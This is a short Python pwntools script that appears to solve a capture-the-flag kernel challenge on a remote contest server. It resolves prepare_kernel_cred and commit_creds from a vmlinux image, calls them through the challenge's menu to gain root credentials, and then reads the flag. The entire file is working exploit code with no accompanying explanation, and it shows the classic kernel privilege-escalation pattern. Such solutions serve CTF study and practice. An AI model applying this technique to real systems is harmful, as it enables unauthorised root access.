#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./client_kernel_baby')
io = remote('arcade.fluxfingers.net', 1817)
kernel = ELF('./vmlinux')

# get the address of 2 functions from vmlinux
cred = kernel.sym['prepare_kernel_cred']
commit = kernel.sym['commit_creds']

# run prepare kernel cred(0) and get the return value
io.recvuntil('----- Menu -----')
io.sendlineafter('> ', '1')
io.sendlineafter('>', str(cred))
io.sendlineafter('>', '0')
io.recvuntil('It is: ')
ret_val = int(io.recvuntil('\n', drop = True),16)

# run commit cred to get root private
io.sendlineafter('> ', '1')
io.sendlineafter('>', str(commit))
io.sendlineafter('>', str(ret_val))

# read flag as root
io.sendlineafter('> ', '3')
io.sendlineafter('>', 'flag')

io.interactive()


